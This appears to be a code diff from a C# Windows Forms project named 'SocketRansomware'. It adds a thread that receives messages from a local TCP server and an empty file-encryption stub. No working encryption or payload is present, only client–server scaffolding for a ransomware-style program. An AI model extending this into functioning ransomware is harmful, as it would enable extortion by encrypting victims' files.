@@ -10,13 +10,14 @@ using System.Windows.Forms;
 using System.Net;
 using System.Net.Sockets;
 using System.Net.NetworkInformation;
-
+using System.Threading;
 
 namespace SocketRansomware
 {
     public partial class Form1 : Form
     {
         TcpClient client;
+        Thread receiveMessageThread = null;
         public Form1()
         {
             InitializeComponent();
@@ -33,6 +34,9 @@ namespace SocketRansomware
             {
                 client = new TcpClient(); //연결
                 client.Connect("127.0.0.1", 8080); //설정
+                receiveMessageThread = new Thread(ReceiveMessage);
+                receiveMessageThread.IsBackground = true;
+                receiveMessageThread.Start();
                 SendDataServer();
              
             }
@@ -92,12 +96,37 @@ namespace SocketRansomware
             lbDate2.Text = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
         }
 
+        private void ReceiveMessage()
+        {
+            byte[] bytes = new byte[1024];
+            while(true)
+            {
+                try
+                {
+                   for(int i = 0; i < 1024; i++) bytes[i] = 0;
+                    NetworkStream net = client.GetStream();//네트워크스트림(소켓상에 데이터가 존재하는곳)
+                    net.Read(bytes, 0, bytes.Length); //스트림읽기 C++로따지면 recv함수
+                    string str = Encoding.Default.GetString(bytes).Trim('\0');
+                    string[] request = str.Split(';');
+                    Console.WriteLine(str);
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine(e.Message);
+                    break;
+                }
+            }
+        }
+
         private void lbAboutBit_Click(object sender, EventArgs e)
         {
 
         }
 
-      
+        private void EncrypteFile()
+        {
+
+        }
 
         private void count_down(object sender, EventArgs e)
         {
